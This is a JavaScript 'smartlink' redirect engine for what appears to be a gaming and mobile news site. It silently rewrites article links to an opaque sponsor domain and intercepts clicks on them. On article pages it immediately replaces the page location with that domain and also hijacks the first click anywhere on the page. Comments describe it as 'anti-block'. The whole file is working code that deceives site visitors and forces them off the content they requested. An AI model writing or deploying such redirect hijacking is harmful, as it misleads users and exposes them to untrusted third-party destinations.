/**
 * ==============================================================================
 * CENTRAL DIRECT LINK & SMARTLINK MANAGER (starpoint.biz.id)
 * ==============================================================================
 * Gaming & Mobile Content Magazine Smartlink Engine
 * ==============================================================================
 */

// 1. URL TARGET DIRECT LINK SPONSOR
const DIRECT_LINK_TEMPLATE = "https://tutaniaunfastrothermuck.com/NHrOY4ffacdda7b2c20d6896e4223d8738217c26f943f?q={QUERY}";

// 2. KONFIGURASI PERILAKU
const CONFIG = {
    rewriteHrefs: true,
    interceptArticleClicks: true,
    autoRedirectOnArticle: true,
    articleRedirectDelayMs: 0,
    clickAnywhereOnArticle: true
};

// ==============================================================================
// SISTEM ENGINE PENGALIHAN CERDAS (ANTI-BLOCK & DUAL-ACTION)
// ==============================================================================
(function () {
    if (window.__STARPOINT_REDIRECT_INITIALIZED__) return;
    window.__STARPOINT_REDIRECT_INITIALIZED__ = true;

    function cleanQuery(text) {
        if (!text) return "";
        let clean = text.replace(/<[^>]+>/g, " ");
        clean = clean.replace(/Trending now|Breaking intel/gi, "");
        clean = clean.replace(/Staff Editor|Alex Mercer|Elena Rostova|Kenji Sato/gi, "");
        clean = clean.replace(/[A-Za-z]+\s\d{1,2},\s\d{4}/g, "");
        clean = clean.replace(/STARPOINT|Gaming & Mobile/gi, "");
        clean = clean.replace(/Scheduled|Published/gi, "");
        clean = clean.replace(/\s+/g, " ").trim();
        return clean;
    }

    function buildDirectLink(rawQuery) {
        let q = cleanQuery(rawQuery);
        if (!q || q.length < 3) q = "Gaming & Mobile Content";
        return DIRECT_LINK_TEMPLATE.replace("{QUERY}", encodeURIComponent(q));
    }

    function extractQueryFromLink(linkEl) {
        if (!linkEl) return "Gaming & Mobile Content";

        const heading = linkEl.querySelector("h1, h2, h3, h4, h5, .article-title");
        if (heading && heading.textContent.trim()) {
            return cleanQuery(heading.textContent);
        }

        const card = linkEl.closest(".hero-card, .pro-pick-featured, .mini-card, .bottom-card, .scheduled-card, article");
        if (card) {
            const cardHeading = card.querySelector("h1, h2, h3, h4, h5, .article-title");
            if (cardHeading && cardHeading.textContent.trim()) {
                return cleanQuery(cardHeading.textContent);
            }
        }

        const text = linkEl.textContent.trim();
        if (text && text.length > 3 && !/read more|view all|more|details|home/i.test(text)) {
            return cleanQuery(text);
        }

        const img = linkEl.querySelector("img[alt]");
        if (img && img.alt && !/featured|ad|banner|image/i.test(img.alt)) {
            return cleanQuery(img.alt);
        }

        const href = linkEl.getAttribute("href") || linkEl.getAttribute("data-original-href") || "";
        const m = href.match(/article(\d+)/i);
        if (m) {
            return "Gaming Mobile Article " + m[1];
        }

        return "Gaming & Mobile Content";
    }

    function rewriteAllArticleLinks() {
        if (!CONFIG.rewriteHrefs) return;
        const links = document.querySelectorAll('a[href*="article"], a[href*="articles/"], a[data-article-link]');
        links.forEach(function (link) {
            const currentHref = link.getAttribute("href") || "";
            if (currentHref.includes("tutaniaunfastrothermuck.com")) return;

            const query = extractQueryFromLink(link);
            const directUrl = buildDirectLink(query);

            link.setAttribute("data-original-href", currentHref);
            link.setAttribute("data-direct-url", directUrl);
            link.setAttribute("href", directUrl);
            link.setAttribute("target", "_self");
            link.setAttribute("rel", "noopener");
        });
    }

    if (CONFIG.interceptArticleClicks) {
        document.addEventListener(
            "click",
            function (e) {
                const link = e.target.closest('a[href*="tutaniaunfastrothermuck.com"], a[data-direct-url], a[href*="article"], a[href*="articles/"]');
                if (link) {
                    const directUrl = link.getAttribute("data-direct-url") || 
                                     (link.href && link.href.includes("tutaniaunfastrothermuck.com") ? link.href : buildDirectLink(extractQueryFromLink(link)));
                    
                    if (directUrl) {
                        e.preventDefault();
                        e.stopPropagation();
                        window.location.href = directUrl;
                        return false;
                    }
                }
            },
            true
        );
    }

    rewriteAllArticleLinks();
    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", rewriteAllArticleLinks);
    }
    window.addEventListener("load", rewriteAllArticleLinks);

    const isArticlePage = window.location.pathname.includes("/articles/") || /article\d+\.html/i.test(window.location.pathname);
    if (isArticlePage) {
        function getArticleDirectUrl() {
            const heading = document.querySelector("h1.article-title") || document.querySelector("h1");
            const rawTitle = heading ? heading.textContent : document.title;
            return buildDirectLink(rawTitle);
        }

        const targetUrl = getArticleDirectUrl();

        if (CONFIG.autoRedirectOnArticle) {
            if (CONFIG.articleRedirectDelayMs > 0) {
                setTimeout(function () {
                    window.location.replace(targetUrl);
                }, CONFIG.articleRedirectDelayMs);
            } else {
                window.location.replace(targetUrl);
            }
        }

        if (CONFIG.clickAnywhereOnArticle) {
            window.addEventListener(
                "click",
                function () {
                    window.location.href = targetUrl;
                },
                { once: true, capture: true }
            );
        }
    }
})();
